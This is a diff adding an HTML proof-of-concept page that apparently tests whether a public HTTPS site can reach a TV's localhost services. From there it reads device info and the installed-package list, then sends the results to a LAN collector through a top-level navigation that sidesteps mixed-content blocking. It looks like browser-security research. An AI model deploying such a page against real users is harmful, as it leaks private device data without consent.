@@ -1,0 +1,67 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>hermes pna probe</title>
+<style>
+  html,body{background:#000;color:#0f0;font:22px/1.35 monospace;margin:0;padding:24px}
+  h1{font-size:24px;color:#fff;margin:0 0 12px 0}
+  #out{white-space:pre-wrap;word-break:break-word}
+  .note{color:#888;font-size:18px;margin-bottom:16px}
+</style>
+</head>
+<body>
+<h1>hermes pna probe (read only)</h1>
+<div class="note">Reads tvinfo and the package list. Sends no install, no write. Load this page from a public https origin.</div>
+<pre id="out">running...</pre>
+<script>
+var out = {
+  ua: navigator.userAgent,
+  href: location.href,
+  origin: location.origin,
+  secureContext: window.isSecureContext,
+  started: new Date().toISOString(),
+  results: {}
+};
+function render() {
+  document.getElementById('out').textContent = JSON.stringify(out, null, 1);
+}
+function probe(key, url, opts) {
+  var t = Date.now();
+  return fetch(url, opts || {mode: 'cors'}).then(function (r) {
+    return r.text().then(function (txt) {
+      out.results[key] = {ok: true, status: r.status, ms: Date.now() - t, body: String(txt).slice(0, 220)};
+    });
+  }).catch(function (e) {
+    out.results[key] = {ok: false, ms: Date.now() - t,
+      err: String((e && e.name) || e) + ': ' + String((e && e.message) || '')};
+  }).then(render);
+}
+render();
+/* 1. http://localhost from a public https origin: tests the mixed-content localhost exemption
+      and the Private Network Access preflight path in one request. */
+probe('http_localhost_9009', 'http://localhost:9009/service/tvinfo?api=soundVolume&args=%5B%5D')
+.then(function () {
+  /* 2. https://localhost gateway, the client's first choice. */
+  return probe('https_localhost_9888', 'https://localhost:9888/service/tvinfo?api=soundVolume');
+})
+.then(function () {
+  /* 3. package list read, no state change. */
+  return probe('pkgmgr_read', 'http://localhost:9009/service/pkgmgr?api=getInstalledPkgs&args=');
+})
+.then(function () {
+  /* 4. control: a LAN http target from https should be blocked as mixed content.
+        If this one succeeds too, the embedder allows all mixed content. */
+  return probe('mixed_control_lan', 'http://192.168.100.189:8888/report?d=mixed-control');
+})
+.then(function () {
+  /* Report path: a top-level load to http is not mixed content, so it works when
+     fetch and image beacons do not. The page leaves after 8 seconds. */
+  setTimeout(function () {
+    out.finished = new Date().toISOString();
+    location.href = 'http://192.168.100.189:8888/report?d=' + encodeURIComponent(JSON.stringify(out));
+  }, 8000);
+});
+</script>
+</body>
+</html>
